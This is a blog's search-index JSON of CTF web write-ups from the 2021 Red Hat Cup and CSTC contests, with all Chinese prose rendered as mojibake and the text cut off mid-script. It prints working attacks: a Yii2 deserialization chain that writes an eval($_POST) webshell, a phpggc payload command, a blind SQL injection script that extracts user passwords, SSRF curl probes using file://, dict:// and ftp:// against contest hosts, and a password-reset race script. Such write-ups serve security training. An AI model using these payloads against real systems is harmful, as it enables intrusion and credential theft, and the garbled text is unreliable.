{"meta":{"title":"TARI TARI","subtitle":"","description":"","author":"TARI TARI","url":"https://tari.moe","root":"/"},"pages":[{"title":"","date":"2021-04-01T02:48:42.200Z","updated":"2021-04-01T02:48:42.200Z","comments":true,"path":"404.html","permalink":"https://tari.moe/404.html","excerpt":"","text":"404 å¾ˆæŠ±æ­‰ï¼Œæ‚¨è®¿é—®çš„é¡µé¢ä¸å­˜åœ¨ å¯èƒ½æ˜¯è¾“å…¥åœ°å€æœ‰è¯¯æˆ–è¯¥åœ°å€å·²è¢«åˆ é™¤"},{"title":"æˆ‘æ»´æœ‹å‹ä»¬","date":"2021-04-01T07:30:59.293Z","updated":"2021-04-01T07:30:59.293Z","comments":true,"path":"friends/index.html","permalink":"https://tari.moe/friends/index.html","excerpt":"","text":""},{"title":"","date":"2021-05-09T15:59:42.912Z","updated":"2021-05-09T15:59:42.891Z","comments":true,"path":"about/index.html","permalink":"https://tari.moe/about/index.html","excerpt":"","text":"æ¬¢è¿å¤§ä½¬æ¥è®¿, æœ¬å°ç ´ç«™ä¸»è¦ç”¨äºä¸ªäººè®°å½• ~ Web å°èœä¸€æš, å–œæ¬¢ CTF, ç²¾é€šå„å¤§CTFèµ›äº‹çš„ç­¾åˆ°é¢˜ ( å°±è¯»äºä½›ç§‘é™¢ (ä½›å¤§, ç­‰å­¦æ ¡å•¥æ—¶å€™æ”¹åå­—, å°±å¯ä»¥æ¢äº† è€¶~) åœ¨æ ¡æœŸé—´ä¸»è¦è´Ÿè´£å­¦æ ¡æœåŠ¡å™¨å®‰å…¨è¿ç»´ã€å†…ç½‘æ¸—é€ã€ç»„ç»‡å‚åŠ CTFã€å¼€å‘ä¸€äº›å°å·¥å…·â€¦ ç®€è€Œè¨€ä¹‹å°±æ˜¯å¤šåŠŸèƒ½æ¬ç –äºº, å“ªé‡Œéœ€è¦æ¬å“ªé‡Œ ~ æ¬¢è¿å„ä½è¯„è®ºç•™è¨€ä¸€èµ·è®¨è®ºå„ç§ççç¢ ~"},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2021-04-01T02:44:50.837Z","updated":"2021-04-01T02:44:50.837Z","comments":true,"path":"tags/index.html","permalink":"https://tari.moe/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"2021 çº¢å¸½æ¯å‰3Webé¢˜ Writeupï¼ˆæŒç»­æ›´æ–°ï¼‰","slug":"2021hmb","date":"2021-05-09T15:01:51.000Z","updated":"2021-05-12T00:40:40.341Z","comments":true,"path":"2021/05/09/2021hmb/","link":"","permalink":"https://tari.moe/2021/05/09/2021hmb/","excerpt":"","text":"ä»Šå¹´çº¢å¸½æ¯å¥½åƒéš¾åº¦æ¯”å¾€å¹´å‹å¥½äº†ä¸å°‘ ï¼ˆ find_itç›®å½•çˆ†ç ´ &gt; robots.txt &gt; 1ndexx.php &gt; å°è¯•å¸¸è§ä¿¡æ¯æ³„æ¼å¾— .1ndexx.php.swp è®¿é—® http://eci-2zeg1tmyhxfbomoq43gy.cloudeci1.ichunqiu.com/.1ndexx.php.swp å¾— 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php $link = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#x27;t view my php files?!&lt;/h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php &#125; ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a=$_GET[&#x27;code&#x27;];if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123; die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt; å†™å…¥ phpinfo è®¿é—® hack.php åœ¨ phpinfo é¡µé¢æœç´¢ flag å…³é”®å­—å³å¯ frameworkç›®å½•çˆ†ç ´å¾—æºç  www.zip çœ‹ç½‘é¡µæºç å’Œæºç æ˜“çŸ¥æ¡†æ¶ä¸º Yii2 æ‰¾æ§åˆ¶å™¨ï¼Œ åˆšå¥½ä¹‹å‰å¤ç°äº†ä¸€ç‚¹ yii2 çš„ååºåˆ—åŒ–ï¼Œä¸è¿‡æ²¡è¯¦ç»†åˆ†æ https://www.yuque.com/u2292949/ugffdq/hfgzlc ä¸è¿‡çŸ¥é“æ§åˆ¶ç‚¹åœ¨ å³é€šè¿‡ call_user_func è°ƒç”¨å‡½æ•°ï¼Œæ‰¾ä¸ªPOCï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹çœ‹åˆ†æè¿‡ç¨‹ï¼Œä¼ é€é—¨ 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;phpinfo&#x27;; $this-&gt;id = &quot;123&quot;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;// poc2namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; // ç”Ÿæˆpoc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; Yii2 çš„æ§åˆ¶å™¨è·¯ç”±è¯´æ˜ï¼ˆå³ index.php?r=site/about&amp;message= éƒ¨åˆ†ï¼‰å¯å‚è€ƒ https://www.yiiframework.com/doc/guide/2.0/zh-cn/start-hello æ„é€  EXP æœäº†ä¸‹å‘ç°æœ‰ disable function ç¦ç”¨äº†è¿™äº›å‡½æ•° 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,unset,unlink,return è™½ç„¶æ²¡æœ‰è¿‡æ»¤ eval ä½† call_user_func ç¬¬ä¸€ä¸ªå‚æ•°åªèƒ½ä¸ºå›è°ƒå‡½æ•°ï¼Œè¯•äº†å¾ˆä¹…ï¼Œå‘ç° assert å¯ç”¨ï¼Œäºæ˜¯æ„é€ POCã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;assert&#x27;; $this-&gt;id = &#x27;file_put_contents(&quot;/var/www/html/web/j.php&quot;, \\&#x27;&lt;?php eval($_POST[&quot;s&quot;]); ?&gt;\\&#x27;);&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;// poc2namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; // ç”Ÿæˆpoc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; å†™å…¥ä¸€å¥è¯ï¼Œè¿æ¥ å› ä¸ºæœ‰ disable function é™åˆ¶æ‰§è¡Œå‘½ä»¤ï¼Œå› æ­¤éœ€è¦bypass å°è¯•å¸¸ç”¨bypass æ–¹æ³• æ— æ•ˆï¼Œç„¶åä¸‹é¢é“¾æ¥æœ‰ä¸€äº›å§¿åŠ¿æ²¡æ¥å¾—åŠè¯•ï¼Œç­‰å¤ç°å‡ºæ¥å¯ä»¥è¯•è¯• https://www.freebuf.com/articles/network/263540.html åç­‰å…¶ä»–å¸ˆå‚…WP ï¼ˆ 5æœˆ12æ—¥æ›´æ–° çªç„¶å‘ç°äº†ç®€å•çš„åšæ³•ï¼Œæ²¡æƒ³åˆ° phpggc è‡ªå®šä¹‰ä»£ç åŠŸèƒ½è¿˜æŒºå¥½ç”¨çš„ 1phpggc Yii2/RCE2 &#x27;eval($_REQUEST[&quot;ant&quot;]);&#x27; | base64 ç„¶åç»•è¿‡ disable function çš„æ–¹æ³•æ˜¯ Apache_mode_cgiï¼Œæ™šäº›æ­ç¯å¢ƒçœ‹çœ‹ä¸ºå•¥æ¯”èµ›æ—¶æˆ‘æ²¡æ³•æˆåŠŸç»•è¿‡çš„.. WebsiteMangeræ³¨å…¥ç‚¹åœ¨ image.php äºŒåˆ†æ³•æ—¶é—´å»¶è¿Ÿæ³¨å…¥ è„šæœ¬æ¥è‡ª Challenger å¸ˆå‚… 1234567891011121314151617181920212223import requestsurl = &#x27;http://eci-2zefme7yqvztnh81ouvm.cloudeci1.ichunqiu.com/image.php?id=&#x27;flag = &quot;&quot;for i in range(1,100): low = 32 high = 128 while low &lt; high: mid = int((low + high) / 2) content = &quot;select/**/group_concat(username,&#x27;:&#x27;,password)/**/from/**/users&quot; sql = f&quot;if(ascii(substr((&#123;content&#125;),&#123;i&#125;,1))&lt;&#123;mid&#125;,1,2)&quot; url2 = url+sql r = requests.get(url2) if len(r.content) == 50811: high = mid else: low = mid + 1 if low == high == 32: print(&quot;&#123;&#125;&quot;.format(flag)) break flag += chr(int((high + low - 1) / 2)) print(&quot;flag : &#123;&#125;&quot;.format(flag)) ä½¿ç”¨ admin å’Œ å¯†ç  ç™»å½•å SSRF å³å¯ 5æœˆ12æ—¥æ›´æ–° çœ‹åˆ°æœ‰äººè¯´ modify.php æ˜¯å¯ä»¥æœªæˆæƒè®¿é—®çš„â€¦ ezlightè¿˜æ²¡çœ‹ã€‚ã€‚ã€‚æ’‡äº†ä¸€çœ¼æºç ï¼Œå¥½åƒæ˜¯ Laravelï¼Ÿå‡ºé¢˜äººæ€•ä¸æ˜¯åœ¨ ctfshow å‡ºé¢˜çš„ã€‚ã€‚ ä¸€ä¸ª Yii2 ä¸€ä¸ª Laravelã€‚ã€‚ã€‚ 5æœˆ12æ—¥æ›´æ–° æ™šç‚¹å¦‚æœæœ‰ç¯å¢ƒå°±å¤ç°å§ï¼ˆ å…ˆæ”¾ä¸€ä¸‹æœ‰ç¬¬å››é¢˜wpçš„é¢˜è§£ æ€»ç»“emmï¼Œä¸çŸ¥æ€ä¹ˆå›äº‹ï¼Œç¬¬ä¸€é¢˜ä¸€å¼€å§‹è®¿é—® .1ndexx.php.swp ç«Ÿç„¶æ²¡ååº”ï¼Œå½“ç„¶è¿˜è¯•äº† gedit çš„ xx~ï¼Œä½›äº† ç¬¬äºŒé¢˜ï¼Œï¼Œä¸€å¼€å§‹ assert ç”¨ä¸äº†ï¼Œè¯´ä»€ä¹ˆå‚æ•°ä¸èƒ½æ˜¯å¯æ§çš„ï¼Œåé¢åˆè¡Œäº†ï¼Œï¼Œè¿™ä¸­é—´æ‰¾å‡½æ•°å’Œå°è¯•æµªè´¹äº†å¥½å¤šå¥½å¤šæ—¶é—´ã€‚ã€‚ã€‚å¯¼è‡´åé¢ç»•è¿‡ disable function æ—¶é—´ä¸å¤Ÿã€‚ ç¬¬ä¸‰é¢˜ï¼Œæ€»ä½“éš¾åº¦ä¸å¤§ ï¼ˆé€ƒ åæ€ï¼š è™½ç„¶ä¹‹å‰çœ‹äº†å¾ˆå¤š disable function bypass çš„æ–‡ç« ï¼Œä½†æ˜¯æ²¡åŠ¨æ‰‹åšè¿‡ï¼Œä¸å¤Ÿç†Ÿç»ƒï¼Œ æŠŠå¸¸ç”¨ disable function bypass è¿‡ä¸€é åˆ·äº†éƒ¨åˆ†ç„¶åä¸€ç›´åœ¨åƒç°çš„ sqli-labs æ˜¯æ—¶å€™ç†ç†äº†â€¦","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"æ¯”èµ›","slug":"ctf/æ¯”èµ›","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"2021CSTCç½‘ç»œå®‰å…¨æŠ€æœ¯å¤§èµ› Writeup","slug":"2021CSTC-ctf","date":"2021-05-06T08:02:43.000Z","updated":"2021-05-09T15:03:57.428Z","comments":true,"path":"2021/05/06/2021CSTC-ctf/","link":"","permalink":"https://tari.moe/2021/05/06/2021CSTC-ctf/","excerpt":"","text":"è¿™æ¬¡æ¯”èµ›æ‰“å®Œï¼Œå‘ç°è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ã€‚ã€‚ è™½ç„¶æ’åè¿˜å¯ä»¥ ï¼ˆå› ä¸ºæœ‰é€†å‘å¤§ä½¬åœ¨ã€‚ã€‚ã€‚ web2å’Œweb3 æ„Ÿè§‰æ¥è¿‘äº†ï¼Œç°æŠŠåšå‡ºæ¥çš„å†™ä¸Š çœ‹çœ‹åé¢æœ‰å¤ç°ç¯å¢ƒä¼šå¤ç°ï¼Œæ²¡æœ‰çš„è¯çœ‹ä¸‹å…¶ä»–å¸ˆå‚…çš„å†™å†™å¤ç›˜ã€‚ ç”±äºweb2å’Œ3å®åœ¨æ²¡æ€è·¯äº†ï¼Œç„¶åé¡ºæ‰‹è§£äº†2ä¸ªç®€å•çš„æ‚é¡¹ã€‚ è¿™é‡Œè¦åæ§½ä¸€ç‚¹ï¼Œä¸ºä»€ä¹ˆé¢˜ç›®ä¸æ˜¯ä¸‹å‘ docker å®¹å™¨å½¢å¼çš„ï¼Œï¼Œè¿™æ ·åˆ«äººå¦‚æœ getshell ä¸å°±å¯ä»¥æ”¹ä»£ç é€»è¾‘æç ´åäº†å—ï¼Ÿ easywebä»£ç  1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET[&#x27;foo&#x27;]);if(is_array($a))&#123; is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL; if(@$a[&quot;bar1&quot;])&#123; ($a[&quot;bar1&quot;]&gt;2021)?$v1=1:NULL; &#125; if(is_array(@$a[&quot;bar2&quot;]))&#123; if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;); $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]); $pos===false?die(&quot;nope&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val)&#123; $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL; &#125; $v2=1; &#125;&#125;$c=@$_GET[&#x27;cat&#x27;];$d=@$_GET[&#x27;dog&#x27;];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL; strpos(($c[0].$d), &quot;cstc2021&quot;)?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include &quot;flag.php&quot;; echo $flag;&#125;?&gt; bar1 å’Œ bar2 å‡‘ä¸€ä¸‹ eregiå‡½æ•°å¯ç”¨ %00 æˆªæ–­ï¼Œåœ¨å‡‘ä¸€ä¸‹ bar3 å³å¯ payload 1http:&#x2F;&#x2F;49.232.167.183:30001&#x2F;?foo&#x3D;&#123;%22bar1%22:%222022a%22,%22bar2%22:[[1],2,3,4,5],%22a2%22:[%22nudt%22]&#125;&amp;cat[0]&#x3D;%00cstc2021&amp;cat[1][0]&#x3D;1&amp;dog&#x3D;222 flag{c32b71bb4aa5c4b2e7a8453f012f9c3e} easyweb2æç¤º1ï¼š http://49.232.167.183:30012/swagger-ui.html æç¤º2ï¼š å·²ç»æ‹¿åˆ°ç®¡ç†å‘˜tokençš„é˜Ÿä¼ï¼Œå…³æ³¨/home/indexæ¥å£ ç™»å½•çˆ†ç ´è·å–token ä¸è¿‡è¿™ä¸ª token æ— æ•ˆ 163a44f5fd4368923e62469611d232a02 çˆ†ç ´ /uid æ¥å£ 123&#123;&quot;ç”¨æˆ·ID&quot;:&quot;987&quot;,&quot;ç”¨æˆ·ç»„&quot;:&quot;ç³»ç»Ÿç®¡ç†å‘˜&quot;,&quot;ç”¨æˆ·å&quot;:&quot;ctf_admin&quot;,&quot;HASH&quot;:&quot;2773d5bd7e1a7a7eec619c6d5fbdfd3a&quot;&#125;&#123;&quot;ç”¨æˆ·ID&quot;:&quot;101&quot;,&quot;ç”¨æˆ·ç»„&quot;:&quot;æ™®é€šç”¨æˆ·&quot;,&quot;ç”¨æˆ·å&quot;:&quot;test&quot;,&quot;HASH&quot;:&quot;098f6bcd4621d373cade4e832627b4f6&quot;&#125; md ç¢°æ’å‡ºå¯†ç å¾—åˆ° Token 19c618e664319512ef7db2d3c0672bee0 è®¿é—®ä¸åˆ°æ—¶ï¼Œä¼šè¿”å› ???? å°è¯•äº†ä»¥ä¸‹ EXPå’Œä¸€äº›å˜å½¢ï¼Œä¸è¿‡éƒ½è¯»ä¸åˆ° flagï¼Œï¼Œå®³ 1234567891011121314151617curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxxx/1.txt&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxxx/t1.php&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=dict://127.0.0.1:6379/_info%250a&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=file:///flag&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://0:30012/image/hacker.jpg&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxx:2233/&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxx5:2233/ HTTP/1.1\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: 119.28.15.55:2233\\r\\n\\r\\nGET / HTTP/1.1\\r\\ntest:&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://49.232.167.183:30012/&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot; æœåŠ¡ç«¯æ˜¯javaæ¥çš„ï¼Œä½†æ„Ÿè§‰ç¦ç”¨äº† file ä¹‹ç±»çš„åè®®ï¼Œï¼Œ ä¸è¿‡ä¸çŸ¥é“æ€æ ·åˆ©ç”¨ï¼Œï¼Œå¡åœ¨è¿™äº† 2021.5.6 17:17 æ›´æ–° éº»äº†ï¼Œçœ‹äº†åˆ«äººé¢˜è§£ https://blog.csdn.net/m0_51078229/article/details/116423096 1curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://127.0.0.1/flag.txt&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot; è¿™ä¸ª flag.txt åœ¨å“ªæ˜¯çŒœçš„è¿˜æ˜¯å“ªé‡Œæœ‰æç¤ºçš„ï¼Ÿè¦æ˜¯å› ä¸ºçŒœä¸åˆ°æ–‡ä»¶åè€Œåšä¸å‡ºæ¥ä¹Ÿå¤ªé‚£å•¥äº†ã€‚ã€‚ 2021.5.6 22:03 æ›´æ–° https://blog.csdn.net/qyCraner/article/details/116459918 åˆæ‰¾äº†ä¸ªé¢˜è§£ï¼Œå‘ç°å‘é€è¯·æ±‚è¯·æ±‚ ftp ç«¯å£ 1curl -X GET &quot;http://49.232.167.183:30012/home/index?url=ftp://127.0.0.1:21/&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot; ä¼šè¿”å›æ–‡ä»¶ä¿¡æ¯ 1-rw-r--r-- 1 root root 39 Apr 30 09:56 flag.txt ç„¶ååœ¨è¯»å–å°±å¥½äº†â€¦.è¿™ä¸ªè¯•èµ·æ¥æœ‰ç‚¹å°éº»çƒ¦æ„Ÿè§‰ï¼Œ ï¼Œä¸»è¦æ˜¯ä¸çŸ¥é“åè®®ã€IPå’Œç«¯å£â€¦è€Œä¸”é¢˜ç›®é€Ÿåº¦è®¿é—®é€Ÿåº¦è´¼æ…¢ï¼Œé¢˜ç›®æœ¬èº«ä¼šä¿æŒè¿æ¥ï¼Œburpä¸æ–¹ä¾¿fuzzï¼Œè¿™ä¸€ç‚¹æ„Ÿè§‰è¦æ‰¾ï¼ˆå¼„ï¼‰ä¸ªå·¥å…· web3ç›®å½•çˆ†ç ´å¾— robots.txt &gt; ç„¶åè®¿é—® PassOn &gt; &gt; å¾—åˆ°æºç  http://49.232.3.115:49496/PassOn/PassOnbackupDirect0ry/backup.zip ç»“åˆæºç reset.phpï¼Œ å…¶å®å¯†ç å°±æ˜¯æ—¶é—´æˆ³éƒ¨åˆ†ï¼Œsha1 å“ˆå¸Œï¼Œå–å‰é¢ 20ä½ 1$password = substr(hash(&#x27;sha1&#x27;, gmdate(&quot;l jS \\of F Y h:i:s A&quot;)), 0, 20); ç„¶åå¸å·å’Œé‚®ç®±åœ¨ css/style.css æ³¨é‡Šé‡Œ é‡ç½®å¯†ç  å‘ç°ç™»å½•ä¸ä¸Šã€‚ã€‚å¯èƒ½å‹æ ¹å°±ä¸æ˜¯æ”¹äº†è¿™ä¸ªå¯†ç ï¼Ÿ 1$sql = $pdo-&gt;prepare(&quot;UPDATE PassOn SET pass = :pass where id = 1&quot;); å…ˆè¯•è¯•ç”¨è„šæœ¬è·‘ï¼Œå› ä¸ºæˆ‘å’Œåˆ«äººåŒæ—¶åœ¨åšï¼Œé˜²æ­¢æ—¶é—´å·® è´´è´´è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import hashlibimport requestsimport threadingflag = Falseuser = &#x27;Ptn4rdn&#x27;passwd = &#x27;&#x27;email = &#x27;Ptn4rdn@gmail.com&#x27;loginUrl = &#x27;http://49.232.3.115:49496/PassOn/login.php&#x27;resetPassUrl = &#x27;http://49.232.3.115:49496/PassOn/reset.php&#x27;def resetPasswd(): global passwd resetData = &#123; &#x27;email&#x27;: email, &#x27;user&#x27;: user, &#x27;submit&#x27;: &#x27;reset&#x27; &#125; gmdate = requests.post(loginUrl, resetData).content[-86:-49] sha1 = hashlib.sha1() sha1.update(gmdate) passwd = sha1.hexdigest()[:20] print(passwd)def login(): global flag, passwd loginData = &#123; &#x27;email&#x27;: email, &#x27;pass&#x27;: passwd, &#x27;submit&#x27;: &#x27;submit&#x27; &#125; res = requests.post(resetPassUrl, loginData) if res.headers.get(&#x27;Cookie&#x27;, 0): flag = True print(passwd) print(res.headers) exit()while flag is False: a = threading.Thread(target=resetPasswd) b = threading.Thread(target=login) a.start() b.start() ä¸å¤ªè¡Œã€‚ã€‚åé¢åˆ©ç”¨å¤§æ¦‚æ˜¯æœ‰æ€è·¯äº†ï¼Œå¡åœ¨ç™»å½•è¿™ã€‚ã€‚ã€‚ 2021.5.6 22:09 æ›´æ–° https://blog.csdn.net/qyCraner/article/details/116459918 æ‰¾äº†ä¸ªé¢˜è§£ï¼Œå‘ç°åˆ«äººå¯ä»¥æ­£å¸¸ç™»å½•ä¸Šå»çš„ã€‚ã€‚ä¸çŸ¥é“æˆ‘å“ªæ­¥é”™äº†ï¼Œè¯·æ•™ä¸€æ³¢åšå‡ºæ¥çš„å¸ˆå‚…ã€‚ã€‚ä»–ä¹Ÿè¯´æˆ‘åšçš„æ­¥éª¤æ²¡æ¯›ç—…ï¼Œï¼Œæ™•äº†ã€‚ ç™»å½•è¿›å»åå°±æ¯”è¾ƒç®€å•äº†ï¼Œè®°å½•å¤±è´¥æ—¥å¿—ä¼šæŠŠé‚®ç®±è®°å½•åˆ° .php æ–‡ä»¶é‡Œï¼ŒæŠŠé‚®ç®±å†™æˆé©¬å°±è¡Œã€‚ä¸»è¦æ˜¯è¿™ä¸ª php æ–‡ä»¶ï¼Œè®°å½• session ä¿¡æ¯ï¼Œå¦‚æœæ²¡ç™»å½•è®¿é—®ä¸äº†è¿™ä¸ªé©¬ã€‚å†™å…¥é©¬åè¿æ¥æ‹¿flagå°±å¥½äº†ã€‚ hackerwebè¿™é¢˜è¿˜æ²¡çœ‹ï¼Œå µåœ¨ç¬¬2å’Œç¬¬3é¢˜äº†â€¦çœ‹çœ‹æœ‰æ²¡æœ‰å¤ç°ç¯å¢ƒï¼Œä¸»è¦æ˜¯åˆ«äººçš„wpä¸æ˜¯å¾ˆè¯¦ç»†ï¼Œä¹Ÿè¿˜æ²¡åŠ¨æ‰‹åšã€‚ RGBæ–‡ä»¶ä¸ºRGBä¸‰åŸè‰²ç»„åˆï¼Œå°è¯•è¿˜åŸå›¾ç‰‡ 1234567891011121314151617181920212223242526from PIL import Imagedef Crack(n): flag = [] for each in range(2,int(n **0.5)+1): if(n % each == 0): print(each,int(n/each)) flag += [(each,int(n/each))] if len(flag) == 1:return flag[0] else: choice = input(&quot;é€‰æ‹©ç¬¬å‡ ç»„(0-%s):&quot;%(len(flag)-1)) return flag[int(choice)]def Paint(X,Y,listrgb): pic = Image.new(&quot;RGB&quot;,(X, Y)) i=0 for x in range (0,X): for y in range (0,Y): temp = listrgb[i].split(&#x27;,&#x27;) pic.putpixel([x,y],(int(temp[0]),int(temp[1]),int(temp[2]))) i = i+1 pic.show() #pic.save(&quot;./flag%s.png&quot;%(X))listrgb = open(&quot;code.txt&quot;).readlines()X,Y = Crack(len(listrgb))Paint(X,Y,listrgb)Paint(Y,X,listrgb) è·‘ä¸€ä¸‹è„šæœ¬é€‰æ‹©ç¬¬ 12 ç»„ï¼Œç„¶åæ°´å¹³ç¿»è½¬ä¸€ä¸‹å³å¯ã€‚ flag{c1d836d1db9d42dd} zipå‹ç¼©åŒ…å¯†ç çˆ†ç ´å¾— ff123 readme.txt ã€‚å°è¯•æ‘©æ–¯å¯†ç å’ŒåŸ¹æ ¹å¯†ç ï¼Œå‘ç°æ˜¯åŸ¹æ ¹å¯†ç ï¼Œè·‘è·‘è„šæœ¬ã€‚ 12345678910111213141516171819202122import retable = &#123;&#x27;a&#x27;: &#x27;aaaaa&#x27;, &#x27;b&#x27;: &#x27;aaaab&#x27;, &#x27;c&#x27;: &#x27;aaaba&#x27;, &#x27;d&#x27;: &#x27;aaabb&#x27;, &#x27;e&#x27;: &#x27;aabaa&#x27;, &#x27;f&#x27;: &#x27;aabab&#x27;, &#x27;g&#x27;: &#x27;aabba&#x27;, &#x27;h&#x27;: &#x27;aabbb&#x27;, &#x27;i&#x27;: &#x27;abaaa&#x27;, &#x27;j&#x27;: &#x27;abaab&#x27;, &#x27;k&#x27;: &#x27;ababa&#x27;, &#x27;l&#x27;: &#x27;ababb&#x27;, &#x27;m&#x27;: &#x27;abbaa&#x27;, &#x27;n&#x27;: &#x27;abbab&#x27;, &#x27;o&#x27;: &#x27;abbba&#x27;, &#x27;p&#x27;: &#x27;abbbb&#x27;, &#x27;q&#x27;: &#x27;baaaa&#x27;, &#x27;r&#x27;: &#x27;baaab&#x27;, &#x27;s&#x27;: &#x27;baaba&#x27;, &#x27;t&#x27;: &#x27;baabb&#x27;, &#x27;u&#x27;: &#x27;babaa&#x27;, &#x27;v&#x27;: &#x27;babab&#x27;, &#x27;w&#x27;: &#x27;babba&#x27;, &#x27;x&#x27;: 